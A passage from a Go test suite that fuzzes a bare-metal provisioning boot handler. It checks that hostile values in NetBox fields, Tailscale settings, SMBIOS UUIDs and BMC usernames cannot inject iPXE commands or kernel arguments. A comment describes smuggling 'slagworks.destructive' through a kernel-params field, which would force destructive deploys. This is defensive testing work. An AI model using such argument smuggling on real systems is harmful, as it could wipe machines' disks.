			c.marker.benign && (!e.tailscale || c.authKey.benign)
	}
	e.tokens = toks
	e.mustServe = allBenign
	return e
}

func sortedCopy(in []string) []string {
	out := append([]string(nil), in...)
	sort.Strings(out)
	return out
}

// propStats counts what the generator actually produced, so a quiet run can
// be told apart from a run that never reached the interesting states.
type propStats struct {
	mu sync.Mutex
	n  map[string]int
}

func (s *propStats) inc(k string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.n == nil {
		s.n = map[string]int{}
	}
	s.n[k]++
}

func (s *propStats) report(t *testing.T) {
	s.mu.Lock()
	defer s.mu.Unlock()
	keys := make([]string, 0, len(s.n))
	for k := range s.n {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var b strings.Builder
	for _, k := range keys {
		fmt.Fprintf(&b, " %s=%d", k, s.n[k])
	}
	t.Logf("coverage:%s", b.String())
}

// checkBootCase is the whole property. realHook selects whether the
// production shell hook is executed for this case (a fork per case).
func checkBootCase(c bootCase, realHook bool, stats *propStats) error {
	script, prov, err := c.render()
	if err != nil {
		return err
	}
	res := ipxeInterpret(script)
	exp := c.expect()
	names := res.commandNames()

	if !res.shebang {
		return fmt.Errorf("script does not start with #!ipxe:\n%q", script)
	}

	kurl, cmdline, oneKernel := res.kernelCmdline()
	served := false
	for _, n := range names {
		if installerCommands[n] {
			served = true
		}
	}

	// P1: a boot-local decision, an unbound op, an unknown machine or an
	// unmet deploy precondition never yields an installer.
	if !exp.mayServe {
		stats.inc("refuse_expected")
		if served {
			return fmt.Errorf("installer served when it must be refused (action=%d known=%v opPresent=%v opBound=%v kp=%q uuid=%q):\n%q",
				c.action, c.machineKnown, c.opPresent, c.opBound, c.kp.v, c.sysUUID.v, script)
		}
		if c.action == model.BootLocal {
			stats.inc("boot_local")
			if len(prov.reports) != 0 {
				return fmt.Errorf("boot-local recorded a progress report: %+v", prov.reports)
			}
		}
		return nil
	}

	if !served {
		if exp.mustServe {
			return fmt.Errorf("installer refused for a case that satisfies every documented precondition (kp=%q uuid=%q):\n%q",
				c.kp.v, c.sysUUID.v, script)
		}
		stats.inc("refused_hostile")
		return nil
	}
	stats.inc("served")
	if exp.mustServe {
		stats.inc("served_benign")
	} else {
		stats.inc("served_hostile")
	}

	// P2: the script is exactly echo, kernel, initrd, boot. Anything else is
	// an injected iPXE command.
	wantNames := []string{"echo", "kernel", "initrd", "boot"}
	if strings.Join(names, ",") != strings.Join(wantNames, ",") || !oneKernel {
		return fmt.Errorf("iPXE script runs commands %v, want %v (injected command):\n%q", names, wantNames, script)
	}
	if len(res.unknownSet) != 0 {
		return fmt.Errorf("script expands iPXE settings %q that the boot handler never intends to read:\n%q", res.unknownSet, script)
	}
	wantBase := fmt.Sprintf("http://%s:%d/files/images/%s", propNextServer, propPort, c.image)
	if kurl != wantBase+"/vmlinuz" {
		return fmt.Errorf("kernel URL %q, want %q", kurl, wantBase+"/vmlinuz")
	}
	if got := res.commands[2]; len(got) != 2 || got[1] != wantBase+"/initrd" {
		return fmt.Errorf("initrd command %q, want [initrd %s/initrd]", got, wantBase)
	}

	// P3: the kernel arguments are exactly the intended multiset.
	gotToks := cFields(cmdline)
	var bmcTok []string
	var rest []string
	for _, tok := range gotToks {
		if strings.HasPrefix(tok, "slagworks.bmc_admin_user=") {
			bmcTok = append(bmcTok, strings.TrimPrefix(tok, "slagworks.bmc_admin_user="))
			continue
		}
		rest = append(rest, tok)
	}
	if g, w := sortedCopy(rest), sortedCopy(exp.tokens); strings.Join(g, "\x1f") != strings.Join(w, "\x1f") {
		return fmt.Errorf("kernel arguments differ from intent.\n got: %q\nwant: %q\ncmdline: %q", g, w, cmdline)
	}

	// slagworks_kernel_params is verbatim kernel command line, so a
	// slagworks.* word in it reaches the hook and the agent as an argument
	// of their own (a device-type field holding "slagworks.destructive"
	// makes every deploy of that type destructive). The handler passes such
	// words through, so the values the hook and agent read back are not
	// compared for those cases; the script shape and the argument multiset
	// above still are.
	if exp.kpAgentArgs {
		stats.inc("kp_agent_args")
		return nil
	}

	// P4: the hook (model and real) recovers exactly the intended values.
	if got := hookModelParse(cmdline); got != exp.hook {
		return fmt.Errorf("hook model parsed %+v, want %+v\ncmdline: %q", got, exp.hook, cmdline)
	}
	if realHook {
		stats.inc("real_hook_runs")
		got, panicked, err := runRealHook(cmdline)
		if err != nil {
			return err
		}
		if panicked {
			return fmt.Errorf("real hook dropped to its panic shell on cmdline %q", cmdline)
		}
		if got != exp.hook {
			return fmt.Errorf("real hook parsed %+v, want %+v\ncmdline: %q", got, exp.hook, cmdline)
		}
	}

	// P5: the agent recovers exactly the intended values.
	deploy := c.action == model.BootDeploy
	wantOOB := ""
	if c.machine.AMT {
		wantOOB = "amt"
	}
	if got := cmdlineValue(cmdline, "slagworks.oob"); got != wantOOB {
		return fmt.Errorf("agent slagworks.oob = %q, want %q", got, wantOOB)
	}
	if cmdlineHas(cmdline, "slagworks.no_reboot") {
		return fmt.Errorf("slagworks.no_reboot present on a generated cmdline: %q", cmdline)
	}
	if !deploy {
		for _, k := range []string{"slagworks.tailscale_authkey", "slagworks.tailscale_hostname", "slagworks.data_marker",
			"slagworks.bmc_admin_user", "slagworks.expect-uuid", "slagworks.destructive", "slagworks.wipe_all_disks"} {
			if cmdlineHas(cmdline, k) {
				return fmt.Errorf("commission cmdline carries deploy-only argument %s: %q", k, cmdline)
			}
		}
		stats.inc("commission_served")
		return nil
	}
	stats.inc("deploy_served")
	wantKey, wantHost := "", ""
	if exp.tailscale {
		wantKey, wantHost = c.authKey.v, c.tsHost.v
		stats.inc("tailscale")
	} else if c.authKey.v != "" {
		stats.inc("tailscale_bad_hostname")
	}
	if got := cmdlineValue(cmdline, "slagworks.tailscale_authkey"); got != wantKey {
		return fmt.Errorf("agent tailscale auth key = %q, want %q", got, wantKey)
	}
	if got := cmdlineValue(cmdline, "slagworks.tailscale_hostname"); got != wantHost {
		return fmt.Errorf("agent tailscale hostname = %q, want %q", got, wantHost)
	}
	if got := cmdlineValue(cmdline, "slagworks.data_marker"); got != c.marker.v {
		return fmt.Errorf("agent data marker = %q, want %q", got, c.marker.v)
	}
	// The identity check the agent runs before touching a disk must accept
	// the real hardware when the persisted UUID names it.
	if c.sysUUID.benign {
		if err := compareUUIDs(exp.hook.ExpectUUID, c.hardwareUUID.String()); err != nil {
			return fmt.Errorf("agent identity check rejects the machine's own hardware: %v", err)
		}
		if err := compareUUIDs(exp.hook.ExpectUUID, "deadbeef-dead-4ead-8ead-deaddeadbeef"); err == nil {
			return fmt.Errorf("agent identity check accepted foreign hardware for expect-uuid %q", exp.hook.ExpectUUID)
		}
	}
	// BMC admin account name: exactly one encoded token that decodes to the
	// intended name, or none.
	switch {
	case c.bmcUser == "":
		if len(bmcTok) != 0 {
			return fmt.Errorf("slagworks.bmc_admin_user=%q emitted with no admin account (amt=%v)", bmcTok, c.machine.AMT)
		}
	default:
		stats.inc("bmc_user")
		if len(bmcTok) != 1 {
			return fmt.Errorf("want exactly one slagworks.bmc_admin_user token, got %q", bmcTok)
		}
		if got := cmdlineValue(cmdline, "slagworks.bmc_admin_user"); got != bmcTok[0] {
			return fmt.Errorf("agent reads bmc_admin_user %q, iPXE token is %q", got, bmcTok[0])
		}
		dec, err := url.QueryUnescape(bmcTok[0])
		if err != nil || dec != c.bmcUser {
			return fmt.Errorf("bmc_admin_user token %q decodes to %q (err %v), want %q", bmcTok[0], dec, err, c.bmcUser)
		}
	}
	// The BMC password must never reach the script.
	if strings.Contains(script, "hunter2-not-on-cmdline") {
		return fmt.Errorf("BMC password leaked into the boot script:\n%q", script)
	}
	// x86 COMMAND_LINE_SIZE is 2048 including the NUL: a longer line is
	// silently truncated by the kernel, dropping the trailing expect-uuid.
	if exp.mustServe && len(cmdline) > 2047 {
		return fmt.Errorf("benign case produced a %d-byte kernel cmdline (> 2047, the kernel truncates it)", len(cmdline))
	}
	if c.params.Destructive {
		stats.inc("destructive")
	}
	if strings.TrimSpace(c.kp.v) == "none" {
		stats.inc("kp_none")
	}
	return nil
}

// ---------------------------------------------------------------------------
// Properties
// ---------------------------------------------------------------------------

// TestProp_BootCmdline_BenignRoundTrip: every value inside its documented
// value space survives server -> iPXE -> hook/agent exactly, an installer is
// served exactly when the documented preconditions hold, and inconsistent
// provider answers are refused.
func TestProp_BootCmdline_BenignRoundTrip(t *testing.T) {
	var stats propStats
	rapid.Check(t, func(t *rapid.T) {
		c := genBootCase(t, genOpts{inconsistentProvider: true})
		if err := checkBootCase(c, false, &stats); err != nil {
			t.Fatalf("%v", err)
		}
	})
	stats.report(t)
}

// TestProp_BootCmdline_RealHookDifferential runs the production shell hook
// on every served benign case.
func TestProp_BootCmdline_RealHookDifferential(t *testing.T) {
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("no /bin/sh")
	}
	var stats propStats
	rapid.Check(t, func(t *rapid.T) {
		c := genBootCase(t, genOpts{})
		if err := checkBootCase(c, true, &stats); err != nil {
			t.Fatalf("%v", err)
		}
	})
	stats.report(t)
}

// The NoInjection properties each open one hostile input so a failure names
// its source. A hostile value must be refused or delivered exactly; a
// tailnet hostname that is not a hostname may instead drop the tailscale
// arguments.

// Kernel params: the NetBox device-type custom field, which the commission
// console sweep also writes.
func TestProp_BootCmdline_NoInjection_KernelParams(t *testing.T) {
	var stats propStats
	rapid.Check(t, func(t *rapid.T) {
		c := genBootCase(t, genOpts{hostileKP: true})
		if err := checkBootCase(c, false, &stats); err != nil {
			t.Fatalf("%v", err)
		}
	})
	stats.report(t)
}

// Tailscale auth key and hostname: the hostname is derived from the NetBox
// device name, which is free text.
func TestProp_BootCmdline_NoInjection_Tailscale(t *testing.T) {
	var stats propStats
	rapid.Check(t, func(t *rapid.T) {
		c := genBootCase(t, genOpts{hostileTailscale: true})
		if err := checkBootCase(c, false, &stats); err != nil {
			t.Fatalf("%v", err)
		}
	})
	stats.report(t)
}

// The persisted SMBIOS UUID (agent-reported at commission).
func TestProp_BootCmdline_NoInjection_SystemUUID(t *testing.T) {
	var stats propStats
	rapid.Check(t, func(t *rapid.T) {
		c := genBootCase(t, genOpts{hostileUUID: true})
		if err := checkBootCase(c, false, &stats); err != nil {
			t.Fatalf("%v", err)
		}
	})
	stats.report(t)
}

// The documented ungated test knobs (fatal_at / efivarfs / data_marker).
func TestProp_BootCmdline_NoInjection_TestKnobs(t *testing.T) {
	var stats propStats
	rapid.Check(t, func(t *rapid.T) {
		c := genBootCase(t, genOpts{hostileKnobs: true})
		if err := checkBootCase(c, false, &stats); err != nil {
			t.Fatalf("%v", err)
		}
	})
	stats.report(t)
}

// TestProp_HookModelMatchesRealHook checks the Go model of the hook against
// the production shell function on arbitrary command lines, so P4's model
// half means something on inputs the boot handler never produces.
func TestProp_HookModelMatchesRealHook(t *testing.T) {
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("no /bin/sh")
	}
	keys := []string{
		"slagworks.server=", "slagworks.image=", "slagworks.mode=", "slagworks.destructive",
		"slagworks.wipe_all_disks", "slagworks.machine=", "slagworks.op=", "slagworks.trace=",
		"slagworks.expect-uuid=", "slagworks.recovery", "slagworks.fatal_at=", "slagworks.efivarfs=",
		"slagworks.destructive=1", "slagworks.destructiveX", "xslagworks.destructive", "console=", "quiet",
		"slagworks.machine", "slagworks.recovery=0",
	}
	// No glob metacharacters: the hook's unquoted $(cat /proc/cmdline) also
	// pathname-expands, which the model deliberately does not reproduce.
	val := genIdent("v", alnum+"-_.:,=/", 0, 12)
	sep := rapid.SampledFrom([]string{" ", "  ", "\t", " \t "})
	rapid.Check(t, func(t *rapid.T) {
		n := rapid.IntRange(0, 12).Draw(t, "n")
		var b strings.Builder
		for i := 0; i < n; i++ {
			k := rapid.SampledFrom(keys).Draw(t, "key")
			b.WriteString(k)
			if strings.HasSuffix(k, "=") {
				b.WriteString(val.Draw(t, "val"))
			}
			b.WriteString(sep.Draw(t, "sep"))
		}
		cmdline := b.String()
		want := hookModelParse(cmdline)
		got, panicked, err := runRealHook(cmdline)
		if err != nil {
			t.Fatalf("%v", err)
		}
		if want.Server == "" {
			if !panicked {
				t.Fatalf("real hook did not panic on a cmdline with no server: %q", cmdline)
			}
			return
		}
		if panicked {
			t.Fatalf("real hook panicked on %q", cmdline)
		}
		if want.Image == "" {
			want.Image = "noble" // documented hook default
		}
		if got != want {
			t.Fatalf("hook model %+v != real hook %+v on %q", want, got, cmdline)
		}
	})
}

// ---------------------------------------------------------------------------
// Injection matrix: bounded exhaustive enumeration of (field, fragment). The
// rapid properties above stop at the first counterexample; this walks every
// cell so the report says which sources are affected and which are not.
// ---------------------------------------------------------------------------

func matrixBaseCase() bootCase {
	hw := uuid.MustParse("4c4c4544-0042-3510-8051-b4c04f4a4433")
	mid := uuid.MustParse("11111111-1111-4111-8111-111111111111")
	c := bootCase{
		action: model.BootDeploy, deployMode: true, image: propImage, reqMAC: propMACs[0],
		machineKnown: true, hardwareUUID: hw,
		opPresent: true, opBound: true, opType: model.OpDeploy, paramsValid: true,
		kp: textValue{"console=ttyS1,115200n8", true}, kpClass: "benign",
		sysUUID: textValue{hw.String(), true},
		fatalAt: textValue{"", true}, efivarfs: textValue{"", true}, marker: textValue{"", true},
		authKey: textValue{"tskey-auth-kABCDEF12345-abcdefghijklmnopqrstuvwxyz", true},
		tsHost:  textValue{"kworker-1-pop2", true},
		bmcUser: "ADMIN",
	}
	c.machine = model.MachineSnapshot{ID: mid, State: model.MachineStateDeploying, PXEEligible: true, BMCUser: "ADMIN"}
	c.op = model.Operation{
		ID:        uuid.MustParse("aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"),
		MachineID: mid, Type: model.OpDeploy, Status: model.OpClaimed,
		TraceID: uuid.MustParse("cccccccc-cccc-4ccc-8ccc-cccccccccccc"),
	}
	return c
}

// finalize copies the textValue fields into the snapshot and op params.
func (c bootCase) finalize() bootCase {
	c.machine.KernelParams = c.kp.v
	c.machine.SystemUUID = c.sysUUID.v
	c.params.FatalAt, c.params.Efivarfs, c.params.DataMarker = c.fatalAt.v, c.efivarfs.v, c.marker.v
	c.params.TailscaleRuntime = &model.TailscaleRuntime{AuthKey: c.authKey.v, Hostname: c.tsHost.v}
	raw, _ := json.Marshal(c.params)
	c.op.Params = raw
	return c
}

func TestBootCmdline_InjectionMatrix(t *testing.T) {
	fields := []struct {
		name  string
		apply func(c *bootCase, v string)
	}{
		{"kernel_params", func(c *bootCase, v string) { c.kp = textValue{"console=ttyS1,115200n8" + v, false} }},
		{"tailscale_hostname", func(c *bootCase, v string) {
			c.tsHost = textValue{"kworker" + v + "-pop2", isSingleSafeToken("kworker" + v + "-pop2")}
		}},
		{"tailscale_authkey", func(c *bootCase, v string) {
			c.authKey = textValue{"tskey-auth-k1" + v, isSingleSafeToken("tskey-auth-k1" + v)}
		}},
		{"system_uuid", func(c *bootCase, v string) {
			c.sysUUID = textValue{c.hardwareUUID.String() + v, false}
		}},
		{"fatal_at", func(c *bootCase, v string) {
			c.fatalAt = textValue{"partitioning" + v, isSingleSafeToken("partitioning" + v)}
		}},
		{"efivarfs", func(c *bootCase, v string) { c.efivarfs = textValue{"skip" + v, isSingleSafeToken("skip" + v)} }},
		{"data_marker", func(c *bootCase, v string) { c.marker = textValue{"tok" + v, isSingleSafeToken("tok" + v)} }},
		{"bmc_admin_user", func(c *bootCase, v string) { c.bmcUser = "ADMIN" + v; c.machine.BMCUser = c.bmcUser }},
	}
	var stats propStats
	for _, f := range fields {
		var failed []string
		for _, frag := range hostileFragments {
			c := matrixBaseCase()
			f.apply(&c, frag)
			c = c.finalize()
			if err := checkBootCase(c, false, &stats); err != nil {
				failed = append(failed, fmt.Sprintf("%q", frag))
			}
		}
		if len(failed) == 0 {
			t.Logf("%-20s clean for all %d fragments", f.name, len(hostileFragments))
			continue
		}
		t.Errorf("%-20s %d/%d fragments break out of the token or the script line: %s",
			f.name, len(failed), len(hostileFragments), strings.Join(failed, " "))
	}
	// The clean baseline must itself pass, or the matrix means nothing.
	if err := checkBootCase(matrixBaseCase().finalize(), false, &stats); err != nil {
		t.Fatalf("baseline case fails: %v", err)
	}
	stats.report(t)
}
